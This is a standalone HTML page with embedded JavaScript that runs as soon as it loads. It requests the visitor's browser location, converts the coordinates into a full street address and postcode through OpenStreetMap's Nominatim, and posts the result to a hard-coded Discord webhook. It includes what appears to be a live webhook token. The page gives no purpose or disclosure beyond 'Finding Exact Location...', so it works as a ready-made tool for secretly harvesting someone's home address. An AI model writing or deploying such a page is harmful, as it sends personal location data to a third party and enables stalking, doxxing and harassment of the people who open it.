<!DOCTYPE html>
<html>
<body>
    <h3>Finding Exact Location...</h3>
    <script>
        // REPLACE THIS with your actual Discord Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1498816839436730369/VKeJCNasWnZXwmpwjEYOBFynxMcC_a6NPeR1T3VguLPr33mOkAeMoJP866voaZA2yEQT";

        function getExactAddress() {
            if (navigator.geolocation) {
                // This triggers the "Allow location?" popup
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;

                    // Reverse Geocoding: Coordinates -> Address
                    // We use Nominatim (OpenStreetMap) because it's free
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                    const data = await geoRes.json();
                    
                    const address = data.display_name; // Full address including postcode
                    const postcode = data.address.postcode || "Not found";

                    // Send the detailed report to Discord
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "📍 Exact Location Found",
                                color: 15158332, // Red-ish
                                description: `**Full Address:** ${address}\n**Postcode:** \`${postcode}\``,
                                fields: [
                                    { name: "Latitude", value: latitude.toString(), inline: true },
                                    { name: "Longitude", value: longitude.toString(), inline: true }
                                ],
                                footer: { text: "Fetched via Browser Geolocation API" }
                            }]
                        })
                    });
                    
                    document.body.innerHTML = "<h1>✅ Location sent to Discord!</h1>";
                }, () => {
                    document.body.innerHTML = "<h1>❌ Permission Denied.</h1>";
                });
            }
        }

        getExactAddress();
    </script>
</body>
</html>
